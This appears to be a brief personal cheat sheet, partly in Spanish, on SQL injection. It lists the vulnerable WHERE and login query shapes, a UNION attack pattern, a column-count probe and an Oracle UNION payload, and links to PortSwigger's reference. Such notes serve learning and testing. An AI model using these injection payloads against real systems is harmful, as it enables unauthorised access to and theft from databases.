# COMMON ATTACKS
Tener en cuenta que no siempre comienza con ' si no con ", )", )', etc...

WHERE QUERY: ```SELECT * FROM USERS WHERE username= '???'```

LOGIN QUERY: ```SELECT * FROM USERS WHERE username= '???' AND password= '???'```

# EXTRAER INFORMACIÓN DE LA DB

# UNION ATTACK
COMMON QUERY: ```SELECT a, b FROM table1 UNION SELECT c, d FROM table2```

Determinar el número de columnas: ```' ORDER BY 1--```


ORACLE: ```' UNION SELECT NULL FROM DUAL--```


# Referencias
- [Burpsuite](https://portswigger.net/web-security/sql-injection/cheat-sheet)
